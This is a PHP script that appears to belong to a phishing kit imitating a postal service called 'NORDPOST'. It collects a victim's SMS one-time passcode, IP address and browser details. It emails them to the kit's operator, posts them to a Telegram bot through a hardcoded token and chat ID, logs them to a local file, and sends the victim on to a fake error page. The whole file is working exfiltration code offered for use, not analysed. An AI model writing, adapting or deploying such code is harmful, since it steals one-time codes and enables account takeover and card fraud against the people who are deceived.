<?php
require_once('Imo.php');
$IP = getenv("REMOTE_ADDR");
$message .= "
------------------>Imo Mamouni< ------------------>
------------------>[ SMS1 NORDPOST ] ------------------>\n";
$message .= " [ SMS1 ] : [  ".$_POST['otp']." ] \n";
$message .= "-------------- IP Infos ------------\n";
$message .= "https://geoiptool.com/en/?ip=$IP\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "---------------------- 07-asefi ----------------------\n";
$sender = "CVV NORDPOST";
$subject = "SMS1 [ " . $IP . " ] ";
$email = "".$EX445093_REMOT."";
mail($email,$subject,$message,$send,$headers);
$token = "1722423438:AAHv-a17_dJ6xqr4g96RyZofP66BvVom-IQ";
$data = [
    'text' => $message,
    'chat_id' => '1665607397'
];

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
    $text = fopen('../Imo_sms.txt', 'a');
fwrite($text, $message);

header("Location: ../otp/smserror.php");
?>